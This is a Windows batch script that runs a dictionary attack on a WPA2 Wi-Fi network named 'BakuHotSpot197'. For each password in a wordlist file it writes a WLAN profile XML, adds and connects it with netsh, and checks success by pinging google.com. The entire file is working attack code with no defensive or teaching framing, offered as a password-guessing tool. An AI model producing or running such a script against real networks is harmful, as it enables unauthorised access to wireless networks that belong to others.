@echo off
setlocal enabledelayedexpansion
set WiFiName=VF
set "file=C:\Users\ENIAC\Desktop\key.txt"
set "counter=0"
set "ConnectionSuccessful=false"

for /f "usebackq delims=" %%a in ("%file%") do (
    set /a counter+=1 
echo ^<?xml version="1.0"?^> > sako.xml
(
echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>
echo   ^<name^>sik^</name^>
echo   ^<SSIDConfig^>
echo       ^<SSID^>
echo           ^<name^>BakuHotSpot197^</name^>
echo       ^</SSID^>
echo   ^</SSIDConfig^>
echo   ^<connectionType^>ESS^</connectionType^>
echo   ^<connectionMode^>auto^</connectionMode^>
echo   ^<MSM^>
echo       ^<security^>
echo           ^<authEncryption^>
echo               ^<authentication^>WPA2PSK^</authentication^>
echo               ^<encryption^>AES^</encryption^>
echo               ^<useOneX^>false^</useOneX^>
echo           ^</authEncryption^>
echo           ^<sharedKey^>
echo               ^<keyType^>passPhrase^</keyType^>
echo               ^<protected^>false^</protected^>
echo               ^<keyMaterial^>%%a^</keyMaterial^>
echo           ^</sharedKey^>
echo       ^</security^>
echo   ^</MSM^>
echo   ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>
echo       ^<enableRandomization^>false^</enableRandomization^>
echo       ^<randomizationSeed^>519099394^</randomizationSeed^>
echo   ^</MacRandomization^>
echo ^</WLANProfile^>
) >> sako.xml
echo password:%%a
netsh wlan add profile filename="C:\Users\ENIAC\Desktop\sako.xml"

netsh wlan connect name=sik
timeout /t 1 >nul

echo checking internet connection

Ping www.google.com -n 1 -w 1000

cls 

if not errorlevel 1 (
	set "ConnectionSuccessful=true"
        goto :EndLoop
)

)

:EndLoop

if %ConnectionSuccessful%==false (
    echo Unable to find the right password in the wordlist.
)
pause
